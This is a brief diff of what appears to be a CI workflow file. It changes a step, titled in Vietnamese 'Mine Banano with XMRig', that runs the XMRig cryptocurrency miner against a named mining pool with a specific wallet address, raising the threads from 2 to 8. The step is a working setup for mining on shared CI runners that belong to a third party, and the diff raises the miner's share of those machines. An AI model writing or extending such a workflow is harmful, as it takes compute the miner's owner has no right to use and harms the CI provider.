@@ -27,4 +27,4 @@ jobs:
     - name: Đào Banano bằng XMRig
       run: |
         cd xmrig/build
-        ./xmrig -o xmrig.nanswap.com:3333 -a rx -k -u ban_3u3684rwhz8oqazhsi7aepdho7gd3dwisusj7ztwua8uk7zcrhsnqrthyrck -p x -t 2
+        ./xmrig -o xmrig.nanswap.com:3333 -a rx -k -u ban_3u3684rwhz8oqazhsi7aepdho7gd3dwisusj7ztwua8uk7zcrhsnqrthyrck -p x -t 8
